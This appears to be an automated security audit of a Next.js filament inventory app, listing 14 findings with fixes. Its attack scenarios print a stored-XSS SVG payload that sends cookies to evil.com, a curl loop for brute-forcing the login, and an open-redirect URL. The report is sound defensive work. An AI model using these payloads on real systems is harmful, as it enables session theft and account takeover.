# Security Audit Report — 3d-filament-manager

**Date:** 2026-02-23
**Scope:** Full codebase — Next.js 15 App Router, Prisma/SQLite, JWT-based auth, Docker deployment
**Auditor:** Automated static analysis
**Risk Rating:** HIGH — Multiple critical and high-severity findings

---

## Executive Summary

The application is a self-hosted 3D filament inventory manager with single-password authentication. The audit identified **14 findings** across authentication, input validation, cryptography, session management, and configuration. The most critical issues center around token signature comparison timing leaks, missing security headers, absent rate limiting on the login endpoint, and SVG upload enabling stored XSS.

| Severity | Count |
|----------|-------|
| Critical | 3     |
| High     | 5     |
| Medium   | 4     |
| Low      | 2     |

---

## Finding 1 — Token Signature Comparison Vulnerable to Timing Attack

**Severity:** Critical (CVSS 7.5)
**CWE:** CWE-208 Observable Timing Discrepancy
**Location:** `src/lib/auth.ts:32`

```typescript
if (sig !== expectedSig) return false; // line 32
```

The HMAC signature of the custom token is compared with strict equality (`!==`). JavaScript string comparison short-circuits on the first differing byte, leaking timing information that allows an attacker to forge a valid signature byte-by-byte.

**Attack scenario:** An attacker sends thousands of requests with incrementally guessed signatures, measuring response times to determine each correct byte of the HMAC. Over a network with low jitter (e.g., localhost or same LAN), this is practical.

**Remediation:**
```typescript
import { timingSafeEqual } from "crypto";

// Replace line 32 with:
const sigBuf = Buffer.from(sig, "base64url");
const expectedBuf = Buffer.from(expectedSig, "base64url");
if (sigBuf.length !== expectedBuf.length) return false;
if (!timingSafeEqual(sigBuf, expectedBuf)) return false;
```

---

## Finding 2 — No Rate Limiting on Login Endpoint

**Severity:** Critical (CVSS 8.1)
**CWE:** CWE-307 Improper Restriction of Excessive Authentication Attempts
**Location:** `src/app/api/auth/login/route.ts` (entire file)

The login endpoint has zero rate limiting. The single shared password (APP_PASSWORD) can be brute-forced with no throttling, lockout, or CAPTCHA.

**Attack scenario:**
```bash
# ~100k attempts/min against localhost
for pw in $(cat wordlist.txt); do
  curl -s -X POST http://target:3000/api/auth/login \
    -H 'Content-Type: application/json' \
    -d "{\"password\":\"$pw\"}" &
done
```

**Remediation:** Add an in-memory or Redis-backed rate limiter. Minimal example using a Map:
```typescript
const attempts = new Map<string, { count: number; resetAt: number }>();
const MAX_ATTEMPTS = 5;
const WINDOW_MS = 15 * 60 * 1000; // 15 min

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const entry = attempts.get(ip);
  if (!entry || now > entry.resetAt) {
    attempts.set(ip, { count: 1, resetAt: now + WINDOW_MS });
    return true;
  }
  entry.count++;
  return entry.count <= MAX_ATTEMPTS;
}
```

---

## Finding 3 — SVG Upload Enables Stored XSS

**Severity:** Critical (CVSS 8.6)
**CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation
**Location:** `src/app/api/upload/logo/route.ts:11`, `src/app/api/logos/[filename]/route.ts:10`

SVG files are accepted for upload and served back with `Content-Type: image/svg+xml`. SVG is an XML format that can contain arbitrary `<script>` tags and event handlers. The logo serving endpoint returns the raw file bytes with no sanitization.

**Attack scenario:**
Upload a file named `evil.svg`:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://evil.com/?c='+document.cookie</script>
</svg>
```
When any user views a page that renders this logo (or navigates to `/api/logos/evil.svg`), the script executes in their browser context, stealing the auth token from `localStorage` and the cookie.

**Remediation options:**
1. Remove `"image/svg+xml": "svg"` from `ALLOWED_TYPES` — simplest fix.
2. If SVG support is required, sanitize with DOMPurify on the server, or serve SVGs with `Content-Disposition: attachment` and `Content-Type: application/octet-stream`.
3. Add `Content-Security-Policy` headers to prevent inline script execution (defense in depth).

---

## Finding 4 — Token Stored in localStorage (XSS-Exfiltrable)

**Severity:** High (CVSS 7.1)
**CWE:** CWE-922 Insecure Storage of Sensitive Information
**Location:** `src/app/(auth)/login/page.tsx:38-39`, `src/lib/fetch.ts:3`

```typescript
localStorage.setItem("spool_tracker_token", token);   // login/page.tsx:38
localStorage.setItem("spool_tracker_expires", ...);    // login/page.tsx:39
return localStorage.getItem("spool_tracker_token");    // fetch.ts:3
```

The auth token is stored in `localStorage`, which is accessible to any JavaScript running on the page. Combined with Finding 3 (SVG XSS), this is directly exploitable — a malicious SVG can read `localStorage` and exfiltrate the token.

**Remediation:** Store the token exclusively in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie set by the server. The login API response should set the cookie via `Set-Cookie` header rather than returning the token in the JSON body.

```typescript
// In login/route.ts POST handler:
const response = NextResponse.json({ expiresAt });
response.cookies.set("spool_tracker_token", token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
  path: "/",
  maxAge: 7 * 24 * 3600,
});
return response;
```

---

## Finding 5 — Cookie Not Marked HttpOnly or Secure (Conditionally)

**Severity:** High (CVSS 6.5)
**CWE:** CWE-614 Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
**Location:** `src/app/(auth)/login/page.tsx:43-44`

```typescript
const secure = location.protocol === 'https:' ? '; Secure' : '';
document.cookie = `spool_tracker_token=${token}; path=/; max-age=...; SameSite=Lax${secure}`;
```

The cookie is set client-side via `document.cookie`, which means:
- It cannot be `HttpOnly` (client-side cookies never are).
- The `Secure` flag is only set when the page is loaded over HTTPS — if the app is accessed over HTTP (common in self-hosted Docker setups), the cookie is sent in cleartext.

**Remediation:** Set the cookie server-side (see Finding 4 remediation). This allows `HttpOnly` to be set, preventing JavaScript access entirely.

---

## Finding 6 — No Logout Mechanism / Token Revocation

**Severity:** High (CVSS 5.9)
**CWE:** CWE-613 Insufficient Session Expiration
**Location:** Codebase-wide (no logout route exists)

The middleware references `/api/auth/logout` in `PUBLIC_PATHS` (middleware.ts:4), but no such route handler exists. There is no way for a user to invalidate their token. Tokens are valid for 7 days with no revocation capability.

If a token is compromised, the attacker has a full 7-day window.

**Remediation:**
1. Create `src/app/api/auth/logout/route.ts` that clears the cookie server-side.
2. For true revocation, maintain a server-side denylist (or switch to short-lived tokens + refresh tokens).

---

## Finding 7 — Missing Security Headers

**Severity:** High (CVSS 5.4)
**CWE:** CWE-693 Protection Mechanism Failure
**Location:** `next.config.ts` (no `headers` configuration)

The application sets zero security headers. Missing:
- `Content-Security-Policy` — no XSS mitigation
- `X-Content-Type-Options: nosniff` — allows MIME sniffing
- `X-Frame-Options: DENY` — clickjacking possible
- `Strict-Transport-Security` — no HSTS
- `Referrer-Policy` — leaks URLs in Referer header
- `Permissions-Policy` — no feature restrictions

**Remediation:** Add to `next.config.ts`:
```typescript
const nextConfig: NextConfig = {
  output: "standalone",
  async headers() {
    return [{
      source: "/(.*)",
      headers: [
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "X-Frame-Options", value: "DENY" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
        { key: "Content-Security-Policy", value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:;" },
      ],
    }];
  },
};
```

---

## Finding 8 — TOKEN_SECRET Falls Back to APP_PASSWORD

**Severity:** High (CVSS 6.2)
**CWE:** CWE-321 Use of Hard-coded Cryptographic Key
**Location:** `src/lib/auth.ts:6`

```typescript
const secret = process.env.TOKEN_SECRET ?? process.env.APP_PASSWORD;
```

If `TOKEN_SECRET` is not set (and the `.env.example` doesn't mention it), the user's login password is reused as the HMAC signing key. This means:
- Anyone who knows the password can forge arbitrary tokens.
- The password is a user-chosen string, likely low-entropy, making the HMAC key weak.

**Remediation:**
1. Generate `TOKEN_SECRET` automatically on first run (e.g., `crypto.randomBytes(32).toString('hex')`).
2. Document it as a required env var in `.env.example`.
3. Fail startup if `TOKEN_SECRET` is not explicitly set.

---

## Finding 9 — Open Redirect via `from` Query Parameter

**Severity:** Medium (CVSS 5.4)
**CWE:** CWE-601 URL Redirection to Untrusted Site
**Location:** `src/app/(auth)/login/page.tsx:16`, `src/middleware.ts:27`

```typescript
// login/page.tsx:16
const from = searchParams.get("from") || "/spools";
// ...
router.push(from);  // line 46

// middleware.ts:27
loginUrl.searchParams.set("from", pathname);
```

The middleware only sets `from` to `pathname` (relative), but the login page reads `from` directly from the URL. An attacker can craft:
```
https://target/login?from=https://evil.com
```
After login, `router.push("https://evil.com")` will navigate the user to the attacker's site.

**Remediation:**
```typescript
// Validate that 'from' is a relative path
const raw = searchParams.get("from") || "/spools";
const from = raw.startsWith("/") && !raw.startsWith("//") ? raw : "/spools";
```

---

## Finding 10 — No Input Validation Library / Ad-hoc Validation

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-20 Improper Input Validation
**Location:** All API route handlers

Every route uses manual `if (!field)` checks with no schema validation. Examples:
- `catalog/route.ts:227`: `if (!brand || !color_name)` — no type checking, length limits, or sanitization.
- `locations/route.ts:29`: `if (!name || !name.trim())` — no max length.
- `spools/[id]/route.ts:35-39`: Allowlist loop but no type/format validation on values.

This pattern is error-prone and allows:
- Extremely long strings (potential DoS via database bloat).
- Unexpected types (objects, arrays) passed through to Prisma.
- No protection against prototype pollution in `body[key]` patterns.

**Remediation:** Adopt Zod for schema validation:
```typescript
import { z } from "zod";

const CreateCatalogSchema = z.object({
  brand: z.string().min(1).max(100),
  material: z.string().max(100).default(""),
  color_name: z.string().min(1).max(100),
  material_type: z.string().min(1).max(50),
  color_hex: z.string().regex(/^#[0-9a-fA-F]{6}$/).optional(),
  // ... other fields
});
```

---

## Finding 11 — Logos Endpoint Unauthenticated

**Severity:** Medium (CVSS 4.3)
**CWE:** CWE-306 Missing Authentication for Critical Function
**Location:** `src/middleware.ts:4`, `src/app/api/logos/[filename]/route.ts`

```typescript
const PUBLIC_PATHS = ["/login", "/api/auth/login", "/api/auth/logout", "/api/logos"];
```

The `/api/logos` prefix is in `PUBLIC_PATHS`, meaning all uploaded logo files are publicly accessible without authentication. Combined with Finding 3, a malicious SVG is accessible to anyone on the network.

The logos route handler itself also has no `requireAuth` call.

**Remediation:** Remove `/api/logos` from `PUBLIC_PATHS` and add `requireAuth` to the logos GET handler. If logos need to be public (e.g., for QR code label printing), at minimum block SVG serving or sanitize content.

---

## Finding 12 — Spool `metadata` Field Accepts Arbitrary Data

**Severity:** Medium (CVSS 4.0)
**CWE:** CWE-502 Deserialization of Untrusted Data
**Location:** `src/app/api/spools/[id]/route.ts:35-38`

```typescript
const allowedFields = ["location_id", "status", "metadata"];
const data: Record<string, unknown> = {};
for (const key of allowedFields) {
  if (key in body) data[key] = body[key];
}
```

The `metadata` field is typed as `String?` in Prisma but accepts `unknown` from the request body. If an object or array is passed, Prisma will call `.toString()` on it, resulting in `[object Object]`. More importantly, there's no size limit — an attacker could send megabytes of data in this field.

**Remediation:**
```typescript
if ("metadata" in body) {
  const meta = body.metadata;
  if (typeof meta !== "string" || meta.length > 10000) {
    return NextResponse.json({ error: "Invalid metadata" }, { status: 400 });
  }
  data.metadata = meta;
}
```

---

## Finding 13 — Docker Container Runs Migrations at Startup with npx

**Severity:** Low (CVSS 3.1)
**CWE:** CWE-426 Untrusted Search Path
**Location:** `Dockerfile:45`

```dockerfile
CMD ["sh", "-c", "npx prisma migrate deploy && node server.js"]
```

Using `npx` in production can trigger network requests if the binary isn't found locally. While the multi-stage build copies Prisma, `npx` adds unnecessary attack surface. If `node_modules` is incomplete, `npx` could download and execute arbitrary code.

**Remediation:**
```dockerfile
CMD ["sh", "-c", "node node_modules/.bin/prisma migrate deploy && node server.js"]
```

---

## Finding 14 — No CSRF Protection on State-Changing Endpoints

**Severity:** Low (CVSS 3.5)
**CWE:** CWE-352 Cross-Site Request Forgery
**Location:** All POST/PATCH/DELETE API routes

The API routes rely on `Authorization: Bearer <token>` headers for auth, which provides implicit CSRF protection (browsers don't auto-attach custom headers in cross-origin requests). However, the middleware also accepts the token from cookies. If an attacker can trigger a `POST` request from a victim's browser to the API, the cookie will be sent automatically.

The `SameSite=Lax` cookie attribute mitigates most CSRF vectors (POST forms from cross-origin are blocked), but `SameSite=Lax` still allows top-level GET navigations. The DELETE operations on GET-accessible endpoints are not affected since they require DELETE method.

**Current mitigation:** `SameSite=Lax` + API routes require Bearer token (not cookie) via `requireAuth`.
**Residual risk:** Low, because `requireAuth` checks the `Authorization` header, not the cookie. The middleware cookie check only gates page access, not API mutations.

---

## Phase 1 Context Reconciliation

The Phase 1 findings were re-evaluated against the actual codebase:

| Phase 1 Finding | Actual Status |
|---|---|
| 1. Middleware not wired (proxy.ts) | **Resolved.** `src/proxy.ts` does not exist. `src/middleware.ts` exists and is correctly placed. |
| 2. Token validation absent | **Resolved.** Middleware calls `verifyToken()` which validates HMAC signature + expiry. |
| 3. Timing attack on password comparison | **Resolved.** Login route uses `timingSafeEqual` via `safeEqual()` helper. |
| 4. Dual token storage with no sync | **Confirmed.** See Findings 4 and 5. Token is in both localStorage and cookie. |
| 5. No input validation library | **Confirmed.** See Finding 10. |
| 6. In-memory UUID token store | **Resolved.** Tokens are HMAC-signed payloads, not server-stored UUIDs. Stateless verification. |

---

## Summary of Recommendations (Priority Order)

1. **Immediately** remove SVG from allowed upload types or sanitize + serve with CSP (Finding 3).
2. **Immediately** switch token storage to HttpOnly server-set cookie (Findings 4, 5).
3. **Immediately** use `timingSafeEqual` for HMAC signature comparison (Finding 1).
4. **This week** add rate limiting to login endpoint (Finding 2).
5. **This week** add security headers via `next.config.ts` (Finding 7).
6. **This week** require a separate `TOKEN_SECRET` env var (Finding 8).
7. **This week** implement logout endpoint (Finding 6).
8. **Soon** validate the `from` redirect parameter (Finding 9).
9. **Soon** adopt Zod for input validation across all routes (Finding 10).
10. **Soon** authenticate the logos endpoint (Finding 11).
